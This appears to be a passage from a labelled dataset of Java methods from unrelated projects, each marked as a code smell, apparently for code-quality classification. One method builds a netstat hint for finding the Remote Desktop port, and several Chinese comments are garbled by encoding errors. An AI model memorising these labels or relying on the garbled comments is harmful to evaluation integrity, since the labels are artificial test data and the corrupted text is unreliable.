    atomSize=atomHeader.readUnsignedInt();
    atomType=atomHeader.readInt();
  }
  if (atomSize == Atom.DEFINES_LARGE_SIZE) {
    int headerBytesRemaining=Atom.LONG_HEADER_SIZE - Atom.HEADER_SIZE;
    input.readFully(atomHeader.data,Atom.HEADER_SIZE,headerBytesRemaining);
    atomHeaderBytesRead+=headerBytesRemaining;
    atomSize=atomHeader.readUnsignedLongToLong();
  }
 else   if (atomSize == Atom.EXTENDS_TO_END_SIZE) {
    long endPosition=input.getLength();
    if (endPosition == C.LENGTH_UNSET && !containerAtoms.isEmpty()) {
      endPosition=containerAtoms.peek().endPosition;
    }
    if (endPosition != C.LENGTH_UNSET) {
      atomSize=endPosition - input.getPosition() + atomHeaderBytesRead;
    }
  }
  if (atomSize < atomHeaderBytesRead) {
    throw new ParserException(""Atom size less than header length (unsupported)."");
  }
  long atomPosition=input.getPosition() - atomHeaderBytesRead;
  if (atomType == Atom.TYPE_moof) {
    int trackCount=trackBundles.size();
    for (int i=0; i < trackCount; i++) {
      TrackFragment fragment=trackBundles.valueAt(i).fragment;
      fragment.atomPosition=atomPosition;
      fragment.auxiliaryDataPosition=atomPosition;
      fragment.dataPosition=atomPosition;
    }
  }
  if (atomType == Atom.TYPE_mdat) {
    currentTrackBundle=null;
    endOfMdatPosition=atomPosition + atomSize;
    if (!haveOutputSeekMap) {
      extractorOutput.seekMap(new SeekMap.Unseekable(durationUs,atomPosition));
      haveOutputSeekMap=true;
    }
    parserState=STATE_READING_ENCRYPTION_DATA;
    return true;
  }
  if (shouldParseContainerAtom(atomType)) {
    long endPosition=input.getPosition() + atomSize - Atom.HEADER_SIZE;
    containerAtoms.push(new ContainerAtom(atomType,endPosition));
    if (atomSize == atomHeaderBytesRead) {
      processAtomEnded(endPosition);
    }
 else {
      enterReadingAtomHeaderState();
    }
  }
 else   if (shouldParseLeafAtom(atomType)) {
    if (atomHeaderBytesRead != Atom.HEADER_SIZE) {
      throw new ParserException(""Leaf atom defines extended atom size (unsupported)."");
    }
    if (atomSize > Integer.MAX_VALUE) {
      throw new ParserException(""Leaf atom with length > 2147483647 (unsupported)."");
    }
    atomData=new ParsableByteArray((int)atomSize);
    System.arraycopy(atomHeader.data,0,atomData.data,0,Atom.HEADER_SIZE);
    parserState=STATE_READING_ATOM_PAYLOAD;
  }
 else {
    if (atomSize > Integer.MAX_VALUE) {
      throw new ParserException(""Skipping atom with length > 2147483647 (unsupported)."");
    }
    atomData=null;
    parserState=STATE_READING_ATOM_PAYLOAD;
  }
  return true;
}",1,Code Smell
"Typeface load();
private static void load(){
  if (typefaces != null || loadingTypefaces) {
    return;
  }
  loadingTypefaces=true;
  Utilities.themeQueue.postRunnable(() -> {
    ArrayList<PaintTypeface> typefaces=new ArrayList<PaintTypeface>(BUILT_IN_FONTS);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && SYSTEM_FONTS_ENABLED) {
      Set<Font> fonts=SystemFonts.getAvailableFonts();
      Iterator<Font> i=fonts.iterator();
      HashMap<String,Family> families=new HashMap<>();
      while (i.hasNext()) {
        Font font=i.next();
        if (font.getFile().getName().contains(""Noto""))         continue;
        FontData data=parseFont(font);
        if (data != null) {
          Family family=families.get(data.family);
          if (family == null) {
            family=new Family();
            families.put(family.family=data.family,family);
          }
          family.fonts.add(data);
        }
      }
      for (      String familyName : preferable) {
        Family family=families.get(familyName);
        if (family != null) {
          FontData font=family.getBold();
          if (font == null) {
            font=family.getRegular();
          }
          if (font != null) {
            typefaces.add(new PaintTypeface(font.font,font.getName()));
          }
        }
      }
    }
    AndroidUtilities.runOnUIThread(() -> {
      PaintTypeface.typefaces=typefaces;
      loadingTypefaces=false;
      NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.customTypefacesLoaded);
    }
);
  }
);
}
",1,Code Smell
"/** 
 * Set online client-balance group consume from max offset
 * @param req     the request object
 * @param sBuffer  string buffer
 * @param result   the result object
 * @return  the return result
 */
public StringBuilder adminSetBalanceGroupConsumeFromMax(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result){
  if (!WebParameterUtils.getAUDBaseInfo(req,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  BaseEntity opEntity=(BaseEntity)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSGROUPNAME,true,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final Set<String> groupNameSet=(Set<String>)result.getRetData();
  ConsumerInfoHolder consumerHolder=master.getConsumerHolder();
  List<String> clientGroups=consumerHolder.getAllClientBalanceGroups();
  Set<String> filtedGroupSet=new TreeSet<>();
  for (  String groupName : groupNameSet) {
    if (clientGroups.contains(groupName)) {
      filtedGroupSet.add(groupName);
    }
  }
  if (filtedGroupSet.isEmpty()) {
    WebParameterUtils.buildFailResult(sBuffer,""all consumer groups are not client balance groups"");
  }
 else {
    ConsumeGroupInfo groupInfo;
    for (    String groupName : filtedGroupSet) {
      groupInfo=consumerHolder.getConsumeGroupInfo(groupName);
      if (groupInfo == null) {
        continue;
      }
      groupInfo.updCsmFromMaxCtrlId();
    }
    logger.info(sBuffer.append(""[Admin reset] "").append(opEntity.getModifyUser()).append("" set client-balance group consume from max offset, group set = "").append(filtedGroupSet.toString()).toString());
    sBuffer.delete(0,sBuffer.length());
    WebParameterUtils.buildSuccessResult(sBuffer);
  }
  return sBuffer;
}",1,Code Smell
"private IncludeGraph(ImmutableMap<AbsolutePackPath,FileNode> nodes,ImmutableMap<AbsolutePackPath,RusticError> failures){
  this.nodes=nodes;
  this.failures=failures;
}
public IncludeGraph(Path root,ImmutableList<AbsolutePackPath> startingPaths){
  Map<AbsolutePackPath,AbsolutePackPath> cameFrom=new HashMap<>();
  Map<AbsolutePackPath,Integer> lineNumberInclude=new HashMap<>();
  Map<AbsolutePackPath,FileNode> nodes=new HashMap<>();
  Map<AbsolutePackPath,RusticError> failures=new HashMap<>();
  List<AbsolutePackPath> queue=new ArrayList<>(startingPaths);
  Set<AbsolutePackPath> seen=new HashSet<>(startingPaths);
  while (!queue.isEmpty()) {
    AbsolutePackPath next=queue.remove(queue.size() - 1);
    String source;
    try {
      source=readFile(next.resolved(root));
    }
 catch (    IOException e) {
      AbsolutePackPath src=cameFrom.get(next);
      if (src == null) {
        throw new RuntimeException(""unexpected error: failed to read "" + next.getPathString(),e);
      }
      String topLevelMessage;
      String detailMessage;
      if (e instanceof NoSuchFileException) {
        topLevelMessage=""failed to resolve #include directive"";
        detailMessage=""file not found"";
      }
 else {
        topLevelMessage=""unexpected I/O error while resolving #include directive: "" + e;
        detailMessage=""IO error"";
      }
      String badLine=nodes.get(src).getLines().get(lineNumberInclude.get(next)).trim();
      RusticError topLevelError=new RusticError(""error"",topLevelMessage,detailMessage,src.getPathString(),lineNumberInclude.get(next) + 1,badLine);
      failures.put(next,topLevelError);
      continue;
    }
    ImmutableList<String> lines=ImmutableList.copyOf(source.split(""\\R""));
    FileNode node=new FileNode(next,lines);
    boolean selfInclude=false;
    for (    Map.Entry<Integer,AbsolutePackPath> include : node.getIncludes().entrySet()) {
      int line=include.getKey();
      AbsolutePackPath included=include.getValue();
      if (next.equals(included)) {
        selfInclude=true;
        failures.put(next,new RusticError(""error"",""trivial #include cycle detected"",""file includes itself"",next.getPathString(),line + 1,lines.get(line)));
        break;
      }
 else       if (!seen.contains(included)) {
        queue.add(included);
        seen.add(included);
        cameFrom.put(included,next);
        lineNumberInclude.put(included,line);
      }
    }
    if (!selfInclude) {
      nodes.put(next,node);
    }
  }
  this.nodes=ImmutableMap.copyOf(nodes);
  this.failures=ImmutableMap.copyOf(failures);
  detectCycle();
}",1,Code Smell
"/** 
 * @param analysis the analysis that just finished.
 */
private void clearUnusedResults(Analysis analysis){
  var edgesToRemove=new ArrayList<>(dependenceGraph.getInEdgesOf(analysis.getId()));
  edgesToRemove.forEach(e -> dependenceGraph.removeEdge(e.source(),e.target()));
  List<String> unused=executedAnalyses.stream().map(Analysis::getId).filter(id -> dependenceGraph.getOutDegreeOf(id) == 0).filter(id -> !plan.keepResult().contains(id)).toList();
  if (!unused.isEmpty()) {
    logger.info(""Clearing unused results of {}"",unused);
    for (    String id : unused) {
      int i;
      for (i=0; i < executedAnalyses.size(); ++i) {
        Analysis a=executedAnalyses.get(i);
        if (a.getId().equals(id)) {
          if (a instanceof ProgramAnalysis) {
            World.get().clearResult(id);
          }
 else           if (a instanceof ClassAnalysis) {
            getClassScope().forEach(c -> c.clearResult(id));
          }
 else           if (a instanceof MethodAnalysis) {
            getMethodScope().forEach(m -> m.getIR().clearResult(id));
          }
          break;
        }
      }
      executedAnalyses.remove(i);
    }
  }
}",1,Code Smell
"/** 
 * @hidden
 */
public KSet int_xor(KSet rhs){
  if (!isTop() && !rhs.isTop()) {
    assert this.bits == rhs.bits;
  }
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getTop(taintRes);
  }
  KSet res=new KSet(bits,taintRes);
  for (  AbsVal op1 : kSet) {
    for (    AbsVal op2 : rhs.kSet) {
      RegionBase region=getRegionBinaryLogic(op1,op2);
      if (region != null) {
        if (res.kSet.size() == GlobalState.config.getK()) {
          return getTop(taintRes);
        }
        if (bits <= 64) {
          assert (op1.bigVal == null && op2.bigVal == null);
          res.kSet=res.kSet.insert(new AbsVal(region,(op1.value ^ op2.value) & getMask(bits)));
        }
 else {
          BigInteger bigOp1=op1.toBigInteger(bits,false);
          BigInteger bigOp2=op2.toBigInteger(bits,false);
          BigInteger tmp=bigOp1.xor(bigOp2).and(getBigMask(bits));
          res.kSet=res.kSet.insert(new AbsVal(region,tmp));
        }
      }
    }
  }
  return res;
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public SysOrgModel insert(SysOrgModel model){
  if (model == null) {
    return null;
  }
  model.setParentIds(null);
  boolean verificationByCode=this.uniqueVerificationByCode(model);
  if (!verificationByCode) {
    throw new ServiceException(SystemMsg.EXCEPTION_ORG_UNIQUE);
  }
  if (StringUtils.isEmpty(model.getParentId()) || TOP_PARENT_ID.equals(model.getParentId())) {
    model.setParentId(TOP_PARENT_ID);
    model.setParentIds(TOP_PARENT_ID);
  }
  if (StringUtils.isNotEmpty(model.getParentId()) && !TOP_PARENT_ID.equals(model.getParentId())) {
    SysOrgModel sysOrgModel=super.get(model.getParentId());
    model.setTenantId(sysOrgModel.getTenantId());
    model.setParentIds(StrUtil.appendIfMissing(sysOrgModel.getParentIds(),DELIMITER) + sysOrgModel.getId());
  }
  if (TenantUtil.SUPER_ADMIN_TENANT_ID.equals(UserUtil.getTenantId())) {
    UserModel superAdmin=UserUtil.getUserByUserName(UserUtil.SUPER_ADMIN);
    if (null != superAdmin) {
      this.clearCache(Collections.singletonList(superAdmin.getId()));
    }
  }
  SysOrgModel insertModel=super.insert(model);
  if (null != insertModel) {
    String orgIds=StrUtil.appendIfMissing(insertModel.getParentIds(),DELIMITER) + insertModel.getId();
    UpdateWrapper<SysOrg> updateWrapper=new UpdateWrapper<>();
    updateWrapper.eq(FieldUtil.humpToUnderline(MyBatisConstants.FIELD_ID),insertModel.getId());
    updateWrapper.set(FieldUtil.humpToUnderline(MyBatisConstants.FIELD_ORG_GROUP),orgIds);
    boolean updateFlag=this.update(updateWrapper);
    if (!updateFlag) {
      throw new RuntimeException(""鏇存柊OrgIds澶辫触"");
    }
    List<String> userIdList=Lists.newArrayList();
    List<String> userIdListByTenantId=iUserRoleRefService.getUserIdListByTenantIdAndAllData(UserUtil.getTenantId());
    List<String> userIdListByOrgIds=iUserOrgRefService.getUserIdListByOrgIds(orgIds);
    userIdList.addAll(userIdListByTenantId);
    userIdList.addAll(userIdListByOrgIds);
    this.clearCache(userIdList);
  }
  return insertModel;
}
",1,Code Smell
"/** 
 * Intercept the target instance method.
 * @param obj          target class instance.
 * @param allArguments all method arguments
 * @param method       method description.
 * @param zuper        the origin call ref.
 * @return the return value of target instance method.
 * @throws Exception only throw exception because of zuper.call() or unexpected exception in sky-walking ( This is abug, if anything triggers this condition ).
 */
@RuntimeType public static Object intercept(@This Object obj,@AllArguments Object[] allArguments,@Morph OverrideCallable zuper,@Origin Method method) throws Throwable {
  EnhancedInstance targetObject=(EnhancedInstance)obj;
  prepare();
  MethodInvocationContext context=new MethodInvocationContext();
  try {
    if (INTERCEPTOR != null) {
      INTERCEPTOR.beforeMethod(targetObject,method,allArguments,method.getParameterTypes(),context);
    }
  }
 catch (  Throwable t) {
    if (LOGGER != null) {
      LOGGER.error(t,""class[{}] before method[{}] intercept failure"",obj.getClass(),method.getName());
    }
  }
  Object ret=null;
  try {
    if (!context.isContinue()) {
      ret=context._ret();
    }
 else {
      ret=zuper.call(allArguments);
    }
  }
 catch (  Throwable t) {
    try {
      if (INTERCEPTOR != null) {
        INTERCEPTOR.handleMethodException(targetObject,method,allArguments,method.getParameterTypes(),t,context);
      }
    }
 catch (    Throwable t2) {
      if (LOGGER != null) {
        LOGGER.error(t2,""class[{}] handle method[{}] exception failure"",obj.getClass(),method.getName());
      }
    }
    throw t;
  }
 finally {
    try {
      if (INTERCEPTOR != null) {
        ret=INTERCEPTOR.afterMethod(targetObject,method,allArguments,method.getParameterTypes(),ret,context);
      }
    }
 catch (    Throwable t) {
      if (LOGGER != null) {
        LOGGER.error(t,""class[{}] after method[{}] intercept failure"",obj.getClass(),method.getName());
      }
    }
  }
  return ret;
}",1,Code Smell
"/** 
 * put targetClass parameter in @MockInvoke to first parameter of the mock method
 */
private void unfoldTargetClass(MethodNode mn){
  String targetClassName=null;
  for (  AnnotationNode an : mn.visibleAnnotations) {
    if (ClassUtil.toByteCodeClassName(MOCK_INVOKE).equals(an.desc)) {
      String name=getTargetClassName(an);
      if (name != null) {
        targetClassName=ClassUtil.toByteCodeClassName(name);
      }
      AnnotationUtil.removeAnnotationParameters(an,FIELD_TARGET_CLASS,FIELD_TARGET_CLASS_NAME);
    }
  }
  if (targetClassName != null) {
    ImmutablePair<LabelNode,LabelNode> labels=getStartAndEndLabel(mn);
    mn.desc=MethodUtil.addParameterAtBegin(mn.desc,targetClassName);
    int parameterOffset=MethodUtil.isStatic(mn) ? 0 : Math.min(mn.localVariables.size(),1);
    mn.localVariables.add(parameterOffset,new LocalVariableNode(SELF_REF,targetClassName,null,labels.left,labels.right,parameterOffset));
    for (int i=parameterOffset + 1; i < mn.localVariables.size(); i++) {
      mn.localVariables.get(i).index++;
    }
    for (    AbstractInsnNode in : mn.instructions) {
      if (in instanceof IincInsnNode) {
        ((IincInsnNode)in).var++;
      }
 else       if (in instanceof VarInsnNode && ((VarInsnNode)in).var >= parameterOffset) {
        ((VarInsnNode)in).var++;
      }
 else       if (in instanceof FrameNode && ((FrameNode)in).type == F_FULL) {
        int pos=((FrameNode)in).local.size() == 0 ? 0 : parameterOffset;
        ((FrameNode)in).local.add(pos,ClassUtil.toSlashSeparateJavaStyleName(targetClassName));
      }
    }
    mn.maxLocals++;
  }
}",1,Code Smell
"/** 
 * 蹇�熷垱寤轰换鎰忔寚瀹氱被鍨嬬殑娴嬭瘯瀵硅薄
 * @param clazz 鏈熸湜鐨勫璞＄被鍨�
 * @param options 鍙�夊弬鏁�
 * @return 杩斿洖鏂板垱寤虹殑瀵硅薄
 */
public static <T>T newInstance(Class<T> clazz,ConstructionOption... options){
  T ins=newInstance(clazz,new HashSet<Class<?>>(INITIAL_CAPACITY),options);
  if (ins == null || CollectionUtil.contains(options,EXCEPT_LOOP_NESTING)) {
    return ins;
  }
  return handleCircleReference(ins);
}
private static <T>T newInstance(Class<T> clazz,Set<Class<?>> classPool,ConstructionOption[] options){
  LogUtil.verbose(classPool.size() * 2,""Creating %s"",clazz.getName());
  if (classPool.contains(clazz)) {
    return null;
  }
  classPool.add(clazz);
  T ins=createSpecialClass(clazz);
  if (ins != null) {
    return ins;
  }
  try {
    if (clazz.isPrimitive()) {
      return newPrimitive(clazz);
    }
 else     if (clazz.equals(Class.class)) {
      return (T)Object.class;
    }
 else     if (clazz.isArray()) {
      return (T)newArray(clazz.getComponentType(),0,classPool,options);
    }
 else     if (clazz.isEnum()) {
      return newEnum(clazz);
    }
 else     if (clazz.isInterface()) {
      return newInterface(clazz,options);
    }
 else     if (Modifier.isAbstract(clazz.getModifiers())) {
      return newAbstractClass(clazz,options);
    }
    return newObject(clazz,classPool,options);
  }
 catch (  NoSuchMethodException e) {
    throw new ClassConstructionException(""Failed to find constructor"",e);
  }
catch (  IllegalAccessException e) {
    throw new ClassConstructionException(""Failed to access constructor"",e);
  }
catch (  InvocationTargetException e) {
    throw new ClassConstructionException(""Failed to invoke constructor"",e);
  }
catch (  InstantiationException e) {
    throw new ClassConstructionException(""Failed to complete construction"",e);
  }
catch (  ClassCastException e) {
    throw new ClassConstructionException(""Unexpected type"",e);
  }
 finally {
    classPool.remove(clazz);
  }
}",1,Code Smell
"@Nullable public DeviceTaskControl runForAllDeviceAsync(Collection<TestRunDevice> allDevices,DeviceTask task,TaskCompletion taskCompletion,boolean isAgentTask){
  return runForAllDeviceAsync(allDevices,task,taskCompletion,true,true,isAgentTask);
}
public DeviceTaskControl runForAllDeviceAsync(Collection<TestRunDevice> allDevices,DeviceTask task,TaskCompletion taskCompletion,boolean logging,boolean forceForTesting,boolean isAgentTask){
  if (isAgentTask) {
    CountDownLatch count=new CountDownLatch(1);
    TestRunDevice fakeDevice=allDevices.iterator().next();
    Runnable run=() -> {
      try {
        if (logging) {
          DeviceTaskControlExecutor.log.info(""start do task on a fake device"");
        }
        task.doTask(fakeDevice);
      }
 catch (      Exception e) {
        DeviceTaskControlExecutor.log.error(e.getMessage(),e);
      }
 finally {
        count.countDown();
        if (count.getCount() <= 0 && taskCompletion != null) {
          taskCompletion.onComplete();
        }
      }
    }
;
    ThreadPoolUtil.TEST_EXECUTOR.execute(run);
    return new DeviceTaskControl(count,Set.of(fakeDevice));
  }
  int activeDevice=0;
  log.warn(""All device count {}"",allDevices.size());
  for (  TestRunDevice device : allDevices) {
    if (!testRunDeviceOrchestrator.isAlive(device)) {
      log.warn(""Device {} not alive"",testRunDeviceOrchestrator.getSerialNum(device));
      continue;
    }
    if (testRunDeviceOrchestrator.isTesting(device) && !forceForTesting) {
      log.warn(""Device {} is under testing"",testRunDeviceOrchestrator.getSerialNum(device));
      continue;
    }
    activeDevice++;
  }
  if (activeDevice <= 0) {
    log.warn(""No device available for this task, forceForTesting: {}"",forceForTesting);
    return null;
  }
  CountDownLatch count=new CountDownLatch(activeDevice);
  final Set<TestRunDevice> devices=new HashSet<>();
  if (logging) {
    log.info(""RunForAllDeviceAsync: on {} devices"",allDevices.size());
  }
  for (  TestRunDevice device : allDevices) {
    if (!testRunDeviceOrchestrator.isAlive(device)) {
      log.info(""RunForAllDeviceAsync: device not alive: {}"",testRunDeviceOrchestrator.getName(device));
      continue;
    }
    if (testRunDeviceOrchestrator.isTesting(device) && !forceForTesting) {
      log.info(""RunForAllDeviceAsync: [BUSY] device is testing: {}"",testRunDeviceOrchestrator.getName(device));
      continue;
    }
    if (logging) {
      device.setLogger(testRunDeviceOrchestrator.getDeviceLogger(device));
    }
    devices.add(device);
    Runnable run=() -> {
      try {
        if (logging) {
          DeviceTaskControlExecutor.log.info(""start do task: {}"",testRunDeviceOrchestrator.getName(device));
        }
        task.doTask(device);
      }
 catch (      Exception e) {
        DeviceTaskControlExecutor.log.error(e.getMessage(),e);
      }
 finally {
        count.countDown();
        if (count.getCount() <= 0 && taskCompletion != null) {
          taskCompletion.onComplete();
        }
      }
    }
;
    ThreadPoolUtil.TEST_EXECUTOR.execute(run);
  }
  return new DeviceTaskControl(count,devices);
}",1,Code Smell
"private boolean checkFunctionParameters(Context context,AbsEnv absEnv,Function callee,Address address){
  String name=callee.getName();
  int paramIndex=interestingSymbols.get(name);
  Logging.debug(""Processing argument "" + paramIndex + "" at ""+ name+ ""()"");
  if (callee.getParameterCount() < paramIndex) {
    Logging.debug(""Not enough parameters for \"""" + name + ""()\"" function"");
    return false;
  }
  boolean result=false;
  KSet argKSet=getParamKSet(callee,paramIndex,absEnv);
  if (argKSet.isTaint()) {
    long taints=argKSet.getTaints();
    List<Source> taintSourceList=TaintMap.getTaintSourceList(taints);
    for (    TaintMap.Source taintSource : taintSourceList) {
      if (isTaintSourceFromEntry(taintSource)) {
        Logging.debug(""*argv appears in argument!"");
        CWEReport report=getNewReport(""Potentially externally controlled format string from source of \""argv\"" to \"""" + name + ""()\"""").setAddress(address);
        Logging.report(report);
        return true;
      }
    }
  }
  if (!argKSet.isNormal()) {
    return false;
  }
  Logging.debug(""KSet for argument: "" + argKSet);
  for (  AbsVal argAbsVal : argKSet) {
    if (!isAbsValWriteable(argAbsVal)) {
      Logging.debug(""Argument is not writeable: "" + argAbsVal);
      continue;
    }
    Logging.debug(""Argument is writeable: "" + argAbsVal);
    CWEReport report=getNewReport(""Potentially externally controlled format string \"""" + name + ""()\"" call"").setAddress(address);
    Logging.report(report);
    result=true;
  }
  return result;
}
",1,Code Smell
"/** 
 * Serializes a LibSVM svm_model to a protobuf.
 * @param model The model to serialize.
 * @return The protobuf representation.
 */
protected static SVMModelProto serializeModel(svm_model model){
  SVMModelProto.Builder modelBuilder=SVMModelProto.newBuilder();
  modelBuilder.setParam(serializeParameters(model.param));
  modelBuilder.setNrClass(model.nr_class);
  modelBuilder.setL(model.l);
  if (model.SV != null) {
    for (int i=0; i < model.SV.length; i++) {
      SVMNodeArrayProto.Builder nodeBuilder=SVMNodeArrayProto.newBuilder();
      for (int j=0; j < model.SV[i].length; j++) {
        nodeBuilder.addIndex(model.SV[i][j].index);
        nodeBuilder.addValue(model.SV[i][j].value);
      }
      modelBuilder.addSV(nodeBuilder.build());
    }
  }
  if (model.sv_coef != null) {
    for (int i=0; i < model.sv_coef.length; i++) {
      modelBuilder.addSvCoefLengths(model.sv_coef[i].length);
      for (int j=0; j < model.sv_coef[i].length; j++) {
        modelBuilder.addSvCoef(model.sv_coef[i][j]);
      }
    }
  }
  if (model.rho != null) {
    modelBuilder.addAllRho(Arrays.stream(model.rho).boxed().collect(Collectors.toList()));
  }
  if (model.probA != null) {
    modelBuilder.addAllProbA(Arrays.stream(model.probA).boxed().collect(Collectors.toList()));
  }
  if (model.probB != null) {
    modelBuilder.addAllProbB(Arrays.stream(model.probB).boxed().collect(Collectors.toList()));
  }
  if (model.sv_indices != null) {
    modelBuilder.addAllSvIndices(Arrays.stream(model.sv_indices).boxed().collect(Collectors.toList()));
  }
  if (model.label != null) {
    modelBuilder.addAllLabel(Arrays.stream(model.label).boxed().collect(Collectors.toList()));
  }
  if (model.nSV != null) {
    modelBuilder.addAllNSV(Arrays.stream(model.nSV).boxed().collect(Collectors.toList()));
  }
  return modelBuilder.build();
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getVisitor(){
  return new PropertiesVisitor<ExecutionContext>(){
    @Override public Properties visitFile(    Properties.File file,    ExecutionContext ctx){
      return !equalIgnoringSeparators(file.getSourcePath(),WRAPPER_PROPERTIES_LOCATION) ? file : super.visitFile(file,ctx);
    }
    @Override public Properties visitEntry(    Properties.Entry entry,    ExecutionContext ctx){
      if (!""distributionUrl"".equals(entry.getKey())) {
        return entry;
      }
      String currentDistributionUrl=entry.getValue().getText();
      Matcher matcher=GRADLE_VERSION.matcher(currentDistributionUrl);
      if (matcher.find()) {
        String currentVersion=matcher.group(1);
        boolean requireVersion=!StringUtils.isNullOrEmpty(version);
        String currentDistribution=matcher.group(2);
        boolean requireMeta=!StringUtils.isNullOrEmpty(distribution);
        wrappersInUse.insertRow(ctx,new GradleWrappersInUse.Row(currentVersion,currentDistribution));
        if (requireVersion) {
          VersionComparator versionComparator=Semver.validate(version,versionPattern).getValue();
          if (versionComparator == null || versionComparator.isValid(null,currentVersion)) {
            if (requireMeta) {
              if (currentDistribution.matches(distribution)) {
                return SearchResult.found(entry);
              }
            }
 else {
              return SearchResult.found(entry);
            }
          }
        }
 else         if (requireMeta) {
          if (currentDistribution.matches(distribution)) {
            return SearchResult.found(entry);
          }
        }
 else {
          return SearchResult.found(entry);
        }
      }
      return entry;
    }
  }
;
}",1,Code Smell
"@Override public final void notifyCheckpointComplete(long checkpointId) throws Exception {
  if (!running) {
    LOG.debug(""notifyCheckpointComplete() called on closed source"");
    return;
  }
  final AbstractFetcher<?,?> fetcher=this.kafkaFetcher;
  if (fetcher == null) {
    LOG.debug(""notifyCheckpointComplete() called on uninitialized source"");
    return;
  }
  if (offsetCommitMode == OffsetCommitMode.ON_CHECKPOINTS) {
    if (LOG.isDebugEnabled()) {
      LOG.debug(""Consumer subtask {} committing offsets to Kafka/ZooKeeper for checkpoint {}."",getRuntimeContext().getIndexOfThisSubtask(),checkpointId);
    }
    try {
      final int posInMap=pendingOffsetsToCommit.indexOf(checkpointId);
      if (posInMap == -1) {
        LOG.warn(""Consumer subtask {} received confirmation for unknown checkpoint id {}"",getRuntimeContext().getIndexOfThisSubtask(),checkpointId);
        return;
      }
      @SuppressWarnings(""unchecked"") Map<KafkaTopicPartition,Long> offsets=(Map<KafkaTopicPartition,Long>)pendingOffsetsToCommit.remove(posInMap);
      for (int i=0; i < posInMap; i++) {
        pendingOffsetsToCommit.remove(0);
      }
      if (offsets == null || offsets.size() == 0) {
        LOG.debug(""Consumer subtask {} has empty checkpoint state."",getRuntimeContext().getIndexOfThisSubtask());
        return;
      }
      fetcher.commitInternalOffsetsToKafka(offsets,offsetCommitCallback);
    }
 catch (    Exception e) {
      if (running) {
        throw e;
      }
    }
  }
}",1,Code Smell
"/** 
 * *
 * @param type          0.涓嶉檺 ,1.蹇呴』鍖呭惈瀛楁瘝+鏁板瓧缁勫悎 , 2.蹇呴』鍖呭惈澶у啓瀛楁瘝+灏忓啓瀛楁瘝+鏁板瓧缁勫悎,3.蹇呴』鍖呭惈瀛楁瘝+鐗规畩瀛楃+鏁板瓧缁勫悎,4.蹇呴』鍖呭惈澶у啓瀛楁瘝+灏忓啓瀛楁瘝+鐗规畩瀛楃+鏁板瓧缁勫悎
 * @param password
 * @param minimumPwdLen 瀵嗙爜鏈�灏忛暱搴�
 */
public static void checkPwdReg(Integer type,String password,Integer minimumPwdLen){
  if (ObjectUtil.equal(0,type)) {
    if (StrUtil.length(password) < minimumPwdLen) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
 else   if (ObjectUtil.equal(1,type)) {
    if (!ReUtil.isMatch(Const.PASS_PASSWORD_WITH_NUMBER_LETTER + minimumPwdLen + Const.PASSWORD_REG_SUFFIX,password)) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
 else   if (ObjectUtil.equal(2,type)) {
    if (!ReUtil.isMatch(Const.PASS_PASSWORD_WITH_NUMBER_UPPER_LETTER + minimumPwdLen + Const.PASSWORD_REG_SUFFIX,password)) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
 else   if (ObjectUtil.equal(3,type)) {
    if (!ReUtil.isMatch(Const.PASS_PASSWORD_WITH_NUMBER_LETTER_CHAR + minimumPwdLen + Const.PASSWORD_REG_SUFFIX,password)) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
 else   if (ObjectUtil.equal(4,type)) {
    if (!ReUtil.isMatch(Const.PASS_PASSWORD_WITH_NUMBER_UPPER_LETTER_CHAR + minimumPwdLen + Const.PASSWORD_REG_SUFFIX,password)) {
      throw new CrmException(SystemCodeEnum.PASSWORD_CHECK_ERROR);
    }
  }
}",1,Code Smell
"public static String ifexe(String[] resultlist2,Map<String,String> exelist){
  String total="""", str2="""";
  for (  String str : resultlist2) {
    if (str != null) {
      for (      Map.Entry<String,String> entry : exelist.entrySet()) {
        if (str.split(""   "")[0].trim().equals(entry.getKey().replace(""\"""",""""))) {
          total=total + entry.getKey().replace(""\"""","""") + ""->""+ entry.getValue().replace(""\"""","""").replace("","","""")+ '\n';
        }
      }
      if (str.contains(""TermService"")) {
        for (int i=0; i < str.length(); i++) {
          if (str.charAt(i) >= 48 && str.charAt(i) <= 57) {
            str2+=str.charAt(i);
          }
        }
      }
    }
  }
  total=total + ""\n杩滅▼妗岄潰pid涓�"" + str2+ '\n'+ ""netstat -ano|findstr \""""+ str2+ ""\""\n鏌ユ壘杩滅▼绔彛"";
  return total;
}",1,Code Smell
"/** 
 * Process  {@link ExecutionCommand} result.The ExecutionCommand currentState must be greater or equal to {@link ExecutionCommand.ExecutionState#EXECUTED}. If the  {@link ExecutionCommand#isPluginExecutionCommand} is {@code true} and{@link ResultConfig#resultPendingIntent} or {@link ResultConfig#resultDirectoryPath}is not  {@code null}, then the result of commands are sent back to the command caller.
 * @param context The {@link Context} that will be used to send result intent to the {@link PendingIntent} creator.
 * @param logTag The log tag to use for logging.
 * @param executionCommand The {@link ExecutionCommand} to process.
 */
public static void processPluginExecutionCommandResult(final Context context,String logTag,final ExecutionCommand executionCommand){
  if (executionCommand == null)   return;
  logTag=DataUtils.getDefaultIfNull(logTag,LOG_TAG);
  Error error=null;
  ResultData resultData=executionCommand.resultData;
  if (!executionCommand.hasExecuted()) {
    Logger.logWarn(logTag,executionCommand.getCommandIdAndLabelLogString() + "": Ignoring call to processPluginExecutionCommandResult() since the execution command state is not higher than the ExecutionState.EXECUTED"");
    return;
  }
  boolean isPluginExecutionCommandWithPendingResult=executionCommand.isPluginExecutionCommandWithPendingResult();
  boolean isExecutionCommandLoggingEnabled=Logger.shouldEnableLoggingForCustomLogLevel(executionCommand.backgroundCustomLogLevel);
